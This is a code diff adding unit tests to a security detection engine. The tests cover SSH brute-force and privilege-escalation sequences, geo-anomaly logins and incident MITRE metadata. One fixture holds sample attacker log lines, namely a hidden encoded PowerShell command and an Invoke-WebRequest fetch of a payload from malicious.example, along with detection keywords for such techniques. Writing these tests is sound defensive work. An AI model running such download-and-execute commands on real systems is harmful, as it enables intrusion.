@@ -31,6 +31,10 @@ def _make_rule(**kwargs) -> Rule:
     r = Rule(
         name=kwargs.get("name", "Test Rule"),
         condition_json=kwargs.get("condition_json", {}),
+        sequence_json=kwargs.get("sequence_json"),
+        group_by_entity=kwargs.get("group_by_entity"),
+        mitre_techniques_json=kwargs.get("mitre_techniques_json"),
+        mitre_tactic=kwargs.get("mitre_tactic"),
         threshold=kwargs.get("threshold", 3),
         window_seconds=kwargs.get("window_seconds", 300),
         severity=kwargs.get("severity", "warning"),
@@ -236,6 +240,281 @@ class TestEvaluateRule:
         assert count == 3
         assert would_fire is True
 
+    @pytest.mark.asyncio
+    async def test_sequence_rule_matches_ordered_steps_with_grouping(self):
+        now = datetime.now(timezone.utc)
+        events = [
+            _make_event(
+                timestamp=now - timedelta(seconds=40),
+                service="sshd",
+                fields_json={"username": "alice", "event_action": "failed_password"},
+            ),
+            _make_event(
+                timestamp=now - timedelta(seconds=30),
+                service="sshd",
+                fields_json={"username": "alice", "event_action": "failed_password"},
+            ),
+            _make_event(
+                timestamp=now - timedelta(seconds=20),
+                service="sshd",
+                fields_json={"username": "alice", "event_action": "login_success"},
+            ),
+            _make_event(
+                timestamp=now - timedelta(seconds=10),
+                service="sshd",
+                fields_json={"username": "bob", "event_action": "failed_password"},
+            ),
+        ]
+
+        mock_result = MagicMock()
+        mock_result.scalars.return_value.all.return_value = events
+
+        session = AsyncMock()
+        session.execute = AsyncMock(return_value=mock_result)
+
+        rule = _make_rule(
+            condition_json={},
+            sequence_json=[
+                {"field": "event_action", "value": "failed_password"},
+                {"field": "event_action", "value": "failed_password"},
+                {"field": "event_action", "value": "login_success"},
+            ],
+            group_by_entity="username",
+            threshold=1,
+            window_seconds=300,
+        )
+
+        count, would_fire = await evaluate_rule(session, rule, reference_time=now)
+
+        assert count == 1
+        assert would_fire is True
+
+    @pytest.mark.asyncio
+    async def test_sequence_rule_groups_by_multiple_fields(self):
+        now = datetime.now(timezone.utc)
+        events = [
+            _make_event(
+                timestamp=now - timedelta(seconds=50),
+                service="sshd",
+                fields_json={"username": "alice", "source_ip": "10.0.0.5", "event_action": "failed_password"},
+            ),
+            _make_event(
+                timestamp=now - timedelta(seconds=40),
+                service="sshd",
+                fields_json={"username": "alice", "source_ip": "10.0.0.5", "event_action": "failed_password"},
+            ),
+            _make_event(
+                timestamp=now - timedelta(seconds=30),
+                service="sshd",
+                fields_json={"username": "alice", "source_ip": "10.0.0.5", "event_action": "failed_password"},
+            ),
+            _make_event(
+                timestamp=now - timedelta(seconds=20),
+                service="sshd",
+                fields_json={"username": "alice", "source_ip": "10.0.0.99", "event_action": "failed_password"},
+            ),
+            _make_event(
+                timestamp=now - timedelta(seconds=10),
+                service="sshd",
+                fields_json={"username": "alice", "source_ip": "10.0.0.99", "event_action": "failed_password"},
+            ),
+        ]
+
+        mock_result = MagicMock()
+        mock_result.scalars.return_value.all.return_value = events
+
+        session = AsyncMock()
+        session.execute = AsyncMock(return_value=mock_result)
+
+        rule = _make_rule(
+            condition_json={},
+            sequence_json=[
+                {"field": "event_action", "value": "failed_password"},
+                {"field": "event_action", "value": "failed_password"},
+                {"field": "event_action", "value": "failed_password"},
+            ],
+            group_by_entity="username,source_ip",
+            threshold=1,
+            window_seconds=300,
+        )
+
+        count, would_fire = await evaluate_rule(session, rule, reference_time=now)
+
+        assert count == 1
+        assert would_fire is True
+
+    @pytest.mark.asyncio
+    async def test_privilege_escalation_sequence_matches_same_user_and_host(self):
+        now = datetime.now(timezone.utc)
+        events = [
+            _make_event(
+                timestamp=now - timedelta(seconds=45),
+                host="srv-admin-01",
+                fields_json={"username": "alice", "event_action": "login_success"},
+            ),
+            _make_event(
+                timestamp=now - timedelta(seconds=30),
+                host="srv-admin-01",
+                fields_json={"username": "alice", "event_action": "privilege_change"},
+            ),
+            _make_event(
+                timestamp=now - timedelta(seconds=15),
+                host="srv-admin-01",
+                fields_json={"username": "alice", "event_action": "sudo_command"},
+            ),
+            _make_event(
+                timestamp=now - timedelta(seconds=10),
+                host="srv-admin-99",
+                fields_json={"username": "alice", "event_action": "sudo_command"},
+            ),
+        ]
+
+        mock_result = MagicMock()
+        mock_result.scalars.return_value.all.return_value = events
+
+        session = AsyncMock()
+        session.execute = AsyncMock(return_value=mock_result)
+
+        rule = _make_rule(
+            condition_json={},
+            sequence_json=[
+                {"field": "event_action", "value_in": ["login_success", "auth_success"]},
+                {"field": "event_action", "value_in": ["privilege_change", "sudo_start", "admin_group_add"]},
+                {"field": "event_action", "value_in": ["sensitive_command", "sudo_command", "credential_dump_attempt"]},
+            ],
+            group_by_entity="username,host",
+            threshold=1,
+            window_seconds=600,
+        )
+
+        count, would_fire = await evaluate_rule(session, rule, reference_time=now)
+
+        assert count == 1
+        assert would_fire is True
+
+    @pytest.mark.asyncio
+    async def test_geo_anomaly_detects_unseen_country_asn_for_user(self):
+        now = datetime.now(timezone.utc)
+        events = [
+            _make_event(
+                timestamp=now - timedelta(seconds=50),
+                fields_json={"username": "alice", "country": "DE", "asn": "AS3320", "event_action": "login_success"},
+            ),
+            _make_event(
+                timestamp=now - timedelta(seconds=40),
+                fields_json={"username": "alice", "country": "DE", "asn": "AS3320", "event_action": "login_success"},
+            ),
+            _make_event(
+                timestamp=now - timedelta(seconds=30),
+                fields_json={"username": "alice", "country": "DE", "asn": "AS3320", "event_action": "login_success"},
+            ),
+            _make_event(
+                timestamp=now - timedelta(seconds=10),
+                fields_json={"username": "alice", "country": "US", "asn": "AS15169", "event_action": "login_success"},
+            ),
+        ]
+
+        mock_result = MagicMock()
+        mock_result.scalars.return_value.all.return_value = events
+
+        session = AsyncMock()
+        session.execute = AsyncMock(return_value=mock_result)
+
+        rule = _make_rule(
+            condition_json={
+                "type": "geo_anomaly",
+                "entity_field": "username",
+                "location_fields": ["country", "asn"],
+                "min_history_events": 3,
+                "min_distinct_locations": 1,
+                "baseline_exclude_recent": 1,
+            },
+            threshold=1,
+            window_seconds=3600,
+        )
+
+        count, would_fire = await evaluate_rule(session, rule, reference_time=now)
+
+        assert count == 1
+        assert would_fire is True
+
+    @pytest.mark.asyncio
+    async def test_geo_anomaly_requires_min_history(self):
+        now = datetime.now(timezone.utc)
+        events = [
+            _make_event(
+                timestamp=now - timedelta(seconds=20),
+                fields_json={"username": "alice", "country": "DE", "asn": "AS3320", "event_action": "login_success"},
+            ),
+            _make_event(
+                timestamp=now - timedelta(seconds=10),
+                fields_json={"username": "alice", "country": "US", "asn": "AS15169", "event_action": "login_success"},
+            ),
+        ]
+
+        mock_result = MagicMock()
+        mock_result.scalars.return_value.all.return_value = events
+
+        session = AsyncMock()
+        session.execute = AsyncMock(return_value=mock_result)
+
+        rule = _make_rule(
+            condition_json={
+                "type": "geo_anomaly",
+                "entity_field": "username",
+                "location_fields": ["country", "asn"],
+                "min_history_events": 3,
+                "baseline_exclude_recent": 1,
+            },
+            threshold=1,
+            window_seconds=3600,
+        )
+
+        count, would_fire = await evaluate_rule(session, rule, reference_time=now)
+
+        assert count == 0
+        assert would_fire is False
+
+    @pytest.mark.asyncio
+    async def test_suspicious_powershell_chain_sequence_matches(self):
+        now = datetime.now(timezone.utc)
+        events = [
+            _make_event(
+                timestamp=now - timedelta(seconds=30),
+                host="workstation-17",
+                message="powershell.exe -windowstyle hidden -encodedcommand AAAA",
+                fields_json={"username": "alice"},
+            ),
+            _make_event(
+                timestamp=now - timedelta(seconds=10),
+                host="workstation-17",
+                message="powershell Invoke-WebRequest http://malicious.example/payload.ps1",
+                fields_json={"username": "alice"},
+            ),
+        ]
+
+        mock_result = MagicMock()
+        mock_result.scalars.return_value.all.return_value = events
+
+        session = AsyncMock()
+        session.execute = AsyncMock(return_value=mock_result)
+
+        rule = _make_rule(
+            condition_json={},
+            sequence_json=[
+                {"message_contains_any": ["-encodedcommand", "-windowstyle hidden", "powershell -enc"]},
+                {"message_contains_any": ["invoke-webrequest", "downloadstring(", "mshta"]},
+            ],
+            group_by_entity="host",
+            threshold=1,
+            window_seconds=900,
+        )
+
+        count, would_fire = await evaluate_rule(session, rule, reference_time=now)
+
+        assert count == 1
+        assert would_fire is True
+
 
 class TestFireIncidentIfNeeded:
     @pytest.mark.asyncio
@@ -295,3 +574,72 @@ class TestFireIncidentIfNeeded:
 
         assert incident is not None
         mark_notification.assert_called_once_with(session, ANY)
+
+    @pytest.mark.asyncio
+    async def test_created_incident_contains_confidence_and_rationale(self):
+        now = datetime.now(timezone.utc)
+        matched_events = [
+            _make_event(timestamp=now - timedelta(seconds=5)),
+            _make_event(timestamp=now),
+        ]
+
+        existing = MagicMock()
+        existing.scalar_one_or_none.return_value = None
+
+        session = AsyncMock()
+        session.add = MagicMock()
+        session.info = {}
+        session.execute = AsyncMock(return_value=existing)
+
+        rule = _make_rule(id="rule-1", name="PowerShell chain", severity="high")
+
+        incident = await fire_incident_if_needed(
+            session,
+            rule,
+            event_count=len(matched_events),
+            first_seen=matched_events[0].timestamp,
+            last_seen=matched_events[-1].timestamp,
+            confidence_score=0.92,
+            confidence_rationale="threshold=2/1, sequence_completeness=1.00, signal_strength=0.95",
+        )
+
+        assert incident is not None
+        assert float(incident.confidence_score) == 0.92
+        assert incident.confidence_rationale is not None
+        assert "sequence_completeness" in incident.confidence_rationale
+
+    @pytest.mark.asyncio
+    async def test_created_incident_inherits_rule_mitre_metadata(self):
+        now = datetime.now(timezone.utc)
+        matched_events = [
+            _make_event(timestamp=now - timedelta(seconds=5)),
+            _make_event(timestamp=now),
+        ]
+
+        existing = MagicMock()
+        existing.scalar_one_or_none.return_value = None
+
+        session = AsyncMock()
+        session.add = MagicMock()
+        session.info = {}
+        session.execute = AsyncMock(return_value=existing)
+
+        rule = _make_rule(
+            id="rule-1",
+            name="PowerShell chain",
+            severity="high",
+            mitre_techniques_json=["T1059.001", "T1105"],
+            mitre_tactic="execution",
+        )
+
+        incident = await fire_incident_if_needed(
+            session,
+            rule,
+            event_count=len(matched_events),
+            first_seen=matched_events[0].timestamp,
+            last_seen=matched_events[-1].timestamp,
+        )
+
+        assert incident is not None
+        assert incident.mitre_techniques_json == ["T1059.001", "T1105"]
+        assert incident.mitre_tactic == "execution"
